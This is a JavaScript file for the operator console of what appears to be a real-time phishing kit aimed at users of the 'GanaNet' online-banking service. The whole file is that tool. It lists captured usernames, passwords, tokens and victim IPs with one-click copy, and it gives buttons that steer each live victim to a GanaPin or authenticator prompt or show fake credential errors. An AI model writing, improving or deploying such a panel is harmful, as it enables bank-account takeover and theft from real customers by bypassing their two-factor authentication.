/**
 * Panel operador GanaNet.
 * Cola ordenada de usuarios en espera para enviar GanaPin o Autenticador.
 */
const LANE_COUNT = 5

const emptyState = document.getElementById('emptyState')
const rowCount = document.getElementById('rowCount')
const hint = document.getElementById('hint')
const btnClean = document.getElementById('btnClean')

/** @type {Map<string, object>} */
const rows = new Map()

function statusLabel(state) {
  if (state === 'waiting') return 'En espera'
  if (state === 'active') return 'Activo'
  if (state === 'done') return 'Listo'
  if (state === 'error-pass') return 'Error clave'
  if (state === 'error-user') return 'Error user'
  if (state === 'error') return 'Error'
  if (state === 'waiting-token') return 'Esperando Token'
  if (state === 'waiting-ganapin') return 'GanaPin enviado'
  if (state === 'waiting-totp') return 'Auth enviado'
  if (state === 'error-token') return 'Error Token'
  if (state === 'typing') return 'Escribiendo código'
  return 'Nuevo'
}

function badgeClass(state) {
  if (
    state === 'waiting' ||
    state === 'waiting-token' ||
    state === 'waiting-ganapin' ||
    state === 'waiting-totp' ||
    state === 'typing'
  ) {
    return 'badge badge--wait'
  }
  if (state === 'active') return 'badge badge--hola'
  if (state === 'done') return 'badge badge--done'
  if (
    state === 'error-pass' ||
    state === 'error-user' ||
    state === 'error' ||
    state === 'error-token'
  ) {
    return 'badge badge--error'
  }
  return 'badge badge--login'
}

function formatTime(ts) {
  try {
    return new Date(ts).toLocaleTimeString('es-BO', {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    })
  } catch (_) {
    return '—'
  }
}

function laneForIndex(index) {
  return ((Number(index) || 1) - 1) % LANE_COUNT
}

function getLaneBody(lane) {
  return document.querySelector(`[data-lane-body="${lane}"]`)
}

function getDeviceIcon(device) {
  if (device === 'mobile') {
    return `
      <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="Celular">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#d96500;">
          <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
          <line x1="12" y1="18" x2="12.01" y2="18"></line>
        </svg>
        Celular
      </span>
    `
  }
  return `
    <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="PC">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#0b5ed7;">
        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
        <line x1="8" y1="21" x2="16" y2="21"></line>
        <line x1="12" y1="17" x2="12" y2="21"></line>
      </svg>
      PC
    </span>
  `
}

function isOnline(row) {
  return !!row.online;
}

async function setRowState(rowId, state, action) {
  const row = rows.get(rowId)
  if (!row) return
  row.state = state
  row.last_seen = Date.now()
  row.updatedAt = Date.now()
  hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`

  try {
    await fetch(`/api/sessions/${rowId}/action`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, state })
    });
  } catch (_) {}
  render()
}

function createRow(row) {
  const tr = document.createElement('tr')
  tr.dataset.rowId = row.id
  tr.innerHTML = `
    <td class="col-num"></td>
    <td class="col-time mono"></td>
    <td class="col-tipo mono"></td>
    <td class="col-device"></td>
    <td class="col-ip mono"></td>
    <td class="col-user mono copyable" title="Copiar usuario"></td>
    <td class="col-pass mono copyable" title="Copiar clave"></td>
    <td class="col-token mono copyable" title="Copiar token"></td>
    <td class="col-online"></td>
    <td class="col-status"></td>
    <td>
      <div class="row-actions">
        <button type="button" class="btn btn--ok" data-action="ganapin">GanaPin</button>
        <button type="button" class="btn btn--ok" data-action="totp">Autenticador</button>
        <button type="button" class="btn btn--error" data-action="error-pass">Err clave</button>
        <button type="button" class="btn btn--error" data-action="error-user">Err user</button>
        <button type="button" class="btn btn--error" data-action="error-token">Err Token</button>
        <button type="button" class="btn btn--done" data-action="done">Listo</button>
      </div>
    </td>
  `

  tr.querySelector('[data-action="ganapin"]')?.addEventListener('click', () => {
    setRowState(row.id, 'waiting-ganapin', 'ganapin')
  })
  tr.querySelector('[data-action="totp"]')?.addEventListener('click', () => {
    setRowState(row.id, 'waiting-totp', 'totp')
  })
  tr.querySelector('[data-action="error-pass"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-pass', 'error-pass')
  })
  tr.querySelector('[data-action="error-user"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-user', 'error-user')
  })
  tr.querySelector('[data-action="error-token"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-token', 'error-token')
  })
  tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
    setRowState(row.id, 'done', 'done')
  })

  tr.querySelectorAll('td.copyable').forEach((td) => {
    td.addEventListener('click', async () => {
      const text = td.textContent?.trim()
      if (!text || text === '—') return
      try {
        await navigator.clipboard.writeText(text)
        td.classList.add('copied')
        setTimeout(() => td.classList.remove('copied'), 900)
      } catch (_) {
        /* ignore */
      }
    })
  })

  return tr
}

function updateRow(tr, row) {
  const online = isOnline(row)
  tr.querySelector('.col-num').textContent = String(row.index)
  tr.querySelector('.col-time').textContent = formatTime(row.createdAt)
  tr.querySelector('.col-tipo').textContent = row.tipo
  tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device)
  tr.querySelector('.col-ip').textContent = row.ip || '—'
  tr.querySelector('.col-user').textContent = row.user || '—'
  tr.querySelector('.col-pass').textContent = row.clave || '—'
  tr.querySelector('.col-token').textContent = row.token || '—'
  tr.querySelector('.col-online').innerHTML = online
    ? '<span class="pill pill--online">En línea</span>'
    : '<span class="pill pill--offline">Off</span>'
  tr.querySelector('.col-status').innerHTML =
    `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`

  const ganapinBtn = tr.querySelector('[data-action="ganapin"]')
  const totpBtn = tr.querySelector('[data-action="totp"]')
  ganapinBtn?.classList.toggle('is-on', row.state === 'waiting-ganapin')
  totpBtn?.classList.toggle('is-on', row.state === 'waiting-totp')
  tr.classList.toggle('is-waiting', row.state === 'waiting')
}

function render() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  list.forEach((row, i) => {
    row.index = i + 1
  })
  rowCount.textContent = String(list.length)
  emptyState.classList.toggle('is-visible', list.length === 0)

  const byLane = Array.from({ length: LANE_COUNT }, () => [])
  list.forEach((row) => {
    byLane[laneForIndex(row.index)].push(row)
  })

  for (let lane = 0; lane < LANE_COUNT; lane += 1) {
    const body = getLaneBody(lane)
    if (!body) continue
    const laneEl = document.querySelector(`[data-lane="${lane}"]`)
    const countEl = laneEl?.querySelector('[data-lane-count]')
    const laneRows = byLane[lane]
    if (countEl) countEl.textContent = String(laneRows.length)

    ;[...body.querySelectorAll('tr[data-row-id]')].forEach((tr) => {
      if (!rows.has(tr.dataset.rowId)) tr.remove()
    })

    laneRows.forEach((row) => {
      let tr = [...body.querySelectorAll('tr[data-row-id]')].find(
        (node) => node.dataset.rowId === row.id,
      )
      if (!tr) {
        tr = createRow(row)
        body.appendChild(tr)
      }
      updateRow(tr, row)
    })
  }
}

async function pollSessions() {
  try {
    const response = await fetch('/api/sessions');
    if (response.ok) {
      const list = await response.json();
      
      // Track existing new entries
      const oldKeys = new Set(rows.keys());
      const newKeys = new Set(list.map(s => s.id));
      
      rows.clear();
      list.forEach((session) => {
        rows.set(session.id, {
          id: session.id,
          index: session.index,
          createdAt: session.createdAt,
          updatedAt: session.updatedAt,
          last_seen: session.last_seen,
          tipo: session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
          device: session.device || 'desktop',
          ip: session.ip || '127.0.0.1',
          user: session.username || session.user || '—',
          clave: session.password || session.clave || '—',
          token: session.token || '',
          state: session.state || 'waiting',
          online: session.online
        });
      });
      render();

      // Trigger flash effect for new rows that were not in old list
      list.forEach((session) => {
        if (!oldKeys.has(session.id)) {
          requestAnimationFrame(() => {
            const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
            if (!tr) return
            tr.classList.add('is-new')
            setTimeout(() => tr.classList.remove('is-new'), 1800)
          })
        }
      });
    }
  } catch (_) {}
}

btnClean?.addEventListener('click', async () => {
  rows.clear()
  try {
    await fetch('/api/clear', { method: 'POST' });
  } catch (_) {}
  hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
  render()
})

// Poll sessions every 2 seconds
window.setInterval(pollSessions, 2000)

// Initial load
pollSessions().then(() => {
  hint.textContent = rows.size
    ? `En cola: ${rows.size}. Elige GanaPin o Autenticador en Acciones.`
    : 'Esperando usuarios del login… Al Verificar llegan aquí ordenados.'
});
